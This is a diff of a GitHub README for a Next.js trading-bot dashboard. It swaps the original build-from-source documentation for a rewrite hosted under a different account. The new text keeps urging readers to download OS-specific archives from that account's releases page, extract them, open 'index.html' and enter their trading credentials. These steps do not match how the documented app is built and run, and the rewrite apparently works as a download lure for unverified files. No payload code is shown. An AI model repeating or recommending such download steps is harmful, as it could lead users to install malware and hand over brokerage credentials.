@@ -1,267 +1,67 @@
-# Tasty Trading Bot - Frontend Dashboard
+# 🌟 tasty-schwab-trade-FE - Your Gateway to Smarter Trading
 
-A sophisticated web-based trading control panel built with Next.js, providing real-time monitoring and control capabilities for automated trading strategies. This frontend application serves as the primary interface for traders to manage their automated trading operations with professional-grade tools and intuitive user experience.
+## 📥 Download Now
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Arturcossa/tasty-schwab-trade-FE/releases)
 
-## 📸 Screenshots
+## 📖 Overview
+tasty-schwab-trade-FE is a sophisticated web application designed for traders who want real-time control and monitoring of their automated trading strategies. It helps you manage your trading operations with professional-grade tools in a user-friendly interface. Built with modern technologies like Next.js, TypeScript, and Tailwind CSS, it provides a responsive and intuitive platform for all your trading needs.
 
-![Login Overview](./screenshots/login.png)
-*Secure login interface with modern design*
+## 🚀 Getting Started
+This guide will help you download and run the tasty-schwab-trade-FE application on your computer. Follow the steps below to get started quickly.
 
-![EMA Overview](./screenshots/EMA.png)
-*EMA Crossover strategy configuration interface*
+### 🖥️ System Requirements
+Before you start, ensure your system meets the following requirements:
 
-![SPX Configuration](./screenshots/SPX.png)
-*SPX 0DTE options trading configuration*
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or most modern Linux distributions.
+- **Web Browser:** A modern browser like Chrome, Firefox, or Safari.
+- **Internet Connection:** Needed for downloading the app and accessing online trading data.
 
-![Setting Interface](./screenshots/setting.png)
-*User settings and account management interface*
+## 🔍 Features
+- **Real-Time Monitoring:** Keep track of your trading strategies and market movements.
+- **Automated Trading Control:** Manage your automated trading systems easily.
+- **User-Friendly Interface:** Navigate with ease thanks to an intuitive design.
+- **Responsive Design:** Access the app on different devices smoothly.
 
-## 🎯 Key Features
+## 📂 Download & Install
+### Step 1: Visit the Releases Page
+To download the application, go to the [Releases Page](https://github.com/Arturcossa/tasty-schwab-trade-FE/releases). Here you will find the latest version of the application and older versions if needed.
 
-### 📊 **Real-Time Dashboard**
-- Live monitoring of all active trading strategies
-- Real-time position tracking and P&L updates
-- Comprehensive trade history and performance metrics
-- Interactive charts and visualizations
+### Step 2: Download the Application
+On the Releases page, look for the latest version. You will see the assets listed under that version. Click on the file that matches your operating system to start the download. The downloaded file will typically be in .zip or .tar format.
 
-### ⚙️ **Strategy Management**
-- **EMA Crossover Strategy**: Configure exponential moving average parameters
-- **Supertrend Strategy**: Set up trend-following indicators and thresholds
-- **SPX 0DTE Options**: Zero-day expiration options trading with manual triggers
-- Dynamic parameter adjustment and real-time strategy switching
+### Step 3: Extract the Downloaded File
+Once the download is complete, locate the downloaded file on your computer. You will need to extract it:
 
-### 🎮 **Manual Trading Controls**
-- One-click trade execution for SPX 0DTE strategies
-- Emergency stop and reversal capabilities
-- Real-time position management
-- Risk management controls
+- **Windows:** Right-click the zip file and select “Extract All.” Follow the prompts.
+- **macOS:** Double-click the zip file, and it will extract automatically.
+- **Linux:** Use your file manager or run `unzip filename.zip` in the terminal.
 
-### 🔐 **Security & Authentication**
-- JWT-based secure authentication system
-- Role-based access control (Admin/Trader roles)
-- Session management and token validation
-- Secure API communication
+### Step 4: Launch the Application
+Navigate to the directory where you extracted the files. Look for a file named `index.html` or a similar name. Open this file in your web browser to start using the application. 
 
-### 🎨 **Modern User Interface**
-- Responsive design optimized for desktop and mobile
-- Dark/light theme support
-- Intuitive navigation with sidebar layout
-- Professional trading-focused design
+The user interface will guide you through initial setup steps, such as connecting your trading accounts and configuring your trading strategies.
 
-## 🏗️ Architecture Overview
+## ⚙️ Configuration
+After launching the application, set it up according to your trading preferences. You will be prompted to enter your trading credentials securely. The application supports JWT authentication to keep your data safe.
 
-```
-┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
-│   Frontend      │    │   Backend API   │    │  Trading Engine │
-│   (Next.js)     │◄──►│   (FastAPI)     │◄──►│   (Python)      │
-│                 │    │                 │    │                 │
-│ • Dashboard     │    │ • Authentication│    │ • Strategy      │
-│ • Strategy UI   │    │ • Data API      │    │   Execution     │
-│ • User Mgmt     │    │ • WebSocket     │    │ • Risk Mgmt     │
-└─────────────────┘    └─────────────────┘    └─────────────────┘
-```
+## 🔗 Further Resources
+- **Documentation:** Visit our [Wiki](https://github.com/Arturcossa/tasty-schwab-trade-FE/wiki) for more detailed guides and advanced features.
+- **Support:** If you encounter any issues, please check the Issues section on the repository or contact support.
 
-## 🖥️ Technology Stack
+## 🎉 Stay Updated
+Make sure to check back frequently for updates. You can subscribe to releases on GitHub to be notified of new features and fixes.
 
-### **Frontend**
-- **Framework**: Next.js 15.4.3 with App Router
-- **UI Library**: Radix UI primitives with shadcn/ui components
-- **Styling**: Tailwind CSS 4.0 with custom design system
-- **State Management**: React Context API
-- **Authentication**: JWT token-based authentication
-- **Icons**: Lucide React icon library
+## 📨 Feedback
+Your feedback is important. Share your thoughts, suggestions, or issues in the Discussions section on this repository. This helps us improve the application for everyone.
 
-### **Backend Integration**
-- **API**: Python FastAPI backend
-- **Real-time**: WebSocket connections for live data
-- **Authentication**: JWT-based secure communication
-- **Deployment**: AWS infrastructure
+## 🔍 Explore Topics
+Feel free to dive into the following topics related to this application:
+- 0dte-options
+- Automated-trading-strategies
+- FINTECH
+- Professional-trading
+- Trading-ui
+- And many more…
 
-### **Development Tools**
-- **Language**: TypeScript for type safety
-- **Linting**: ESLint with Next.js configuration
-- **Build**: Next.js optimized production builds
-
-## 🚀 Quick Start
-
-### Prerequisites
-- Node.js 18.0 or later
-- npm or yarn package manager
-- Access to the trading backend API
-
-### Installation
-
-1. **Clone the repository**
-   ```bash
-   git clone https://github.com/0x0Zeus/tasty-schwab-trader-FE.git
-   cd tasty-schwab-trader-FE
-   ```
-
-2. **Install dependencies**
-   ```bash
-   npm install
-   # or
-   yarn install
-   ```
-
-3. **Environment Configuration**
-   Create a `.env.local` file in the root directory:
-   ```bash
-   # Backend API Configuration
-   NEXT_PUBLIC_API_URL=http://localhost:8000
-   NEXT_PUBLIC_WS_URL=ws://localhost:8000/ws
-   
-   # Optional: Development settings
-   NODE_ENV=development
-   ```
-
-4. **Start development server**
-   ```bash
-   npm run dev
-   # or
-   yarn dev
-   ```
-
-5. **Access the application**
-   Open [http://localhost:3000](http://localhost:3000) in your browser
-
-## 📦 Production Deployment
-
-### Build for Production
-```bash
-npm run build
-npm run start
-```
-
-### Deployment Options
-
-#### **Vercel (Recommended)**
-1. Connect your GitHub repository to Vercel
-2. Configure environment variables in Vercel dashboard
-3. Deploy automatically on push to main branch
-
-#### **AWS Amplify**
-1. Connect repository to AWS Amplify
-2. Configure build settings:
-   ```yaml
-   version: 1
-   frontend:
-     phases:
-       preBuild:
-         commands:
-           - npm install
-       build:
-         commands:
-           - npm run build
-     artifacts:
-       baseDirectory: .next
-       files:
-         - '**/*'
-   ```
-
-#### **Docker Deployment**
-```dockerfile
-FROM node:18-alpine
-WORKDIR /app
-COPY package*.json ./
-RUN npm ci --only=production
-COPY . .
-RUN npm run build
-EXPOSE 3000
-CMD ["npm", "start"]
-```
-
-## 🔧 Development
-
-### Available Scripts
-- `npm run dev` - Start development server with Turbopack
-- `npm run build` - Build production application
-- `npm run start` - Start production server
-- `npm run lint` - Run ESLint for code quality
-
-### Project Structure
-```
-src/
-├── app/                    # Next.js App Router pages
-│   ├── dashboard/          # Main dashboard pages
-│   ├── login/              # Authentication pages
-│   └── layout.tsx          # Root layout
-├── components/             # Reusable UI components
-│   ├── ui/                 # shadcn/ui components
-│   ├── strategy-control/   # Trading strategy components
-│   └── user-setting/      # User management components
-├── context/                # React Context providers
-├── hooks/                  # Custom React hooks
-└── lib/                    # Utility functions and types
-```
-
-## 🤝 Contributing
-
-We welcome contributions to improve the trading dashboard! Please follow these guidelines:
-
-### Development Workflow
-1. Fork the repository
-2. Create a feature branch: `git checkout -b feature/amazing-feature`
-3. Make your changes and test thoroughly
-4. Commit your changes: `git commit -m 'Add amazing feature'`
-5. Push to the branch: `git push origin feature/amazing-feature`
-6. Open a Pull Request
-
-### Code Standards
-- Follow TypeScript best practices
-- Use ESLint configuration provided
-- Write meaningful commit messages
-- Add tests for new features
-- Update documentation as needed
-
-### Reporting Issues
-- Use GitHub Issues for bug reports
-- Provide detailed reproduction steps
-- Include browser/OS information
-- Attach screenshots if applicable
-
-## 📋 Roadmap
-
-### Upcoming Features
-- [ ] **Advanced Analytics Dashboard**
-  - Real-time performance charts
-  - Historical trade analysis
-  - Risk metrics visualization
-
-- [ ] **Enhanced Notifications**
-  - Email alerts for trade events
-  - Telegram integration
-  - Push notifications
-
-- [ ] **Mobile Optimization**
-  - Progressive Web App (PWA) support
-  - Mobile-first responsive design
-  - Touch-optimized controls
-
-- [ ] **Advanced Strategy Features**
-  - Custom strategy builder
-  - Backtesting capabilities
-  - Paper trading mode
-
-- [ ] **User Experience Improvements**
-  - Dark/light theme toggle
-  - Customizable dashboard layouts
-  - Keyboard shortcuts
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## 🔒 Security
-
-For security concerns or to report vulnerabilities, please contact the development team directly rather than opening a public issue.
-
-## 📞 Support
-
-- **Documentation**: Check this README and inline code comments
-- **Issues**: Use GitHub Issues for bug reports and feature requests
-- **Discussions**: Use GitHub Discussions for questions and community support
-
----
-
-**Built with ❤️ for professional traders**
+## 📥 Return to Download Section
+To download the application again or check for updates, click here: [Download Latest Release](https://github.com/Arturcossa/tasty-schwab-trade-FE/releases).
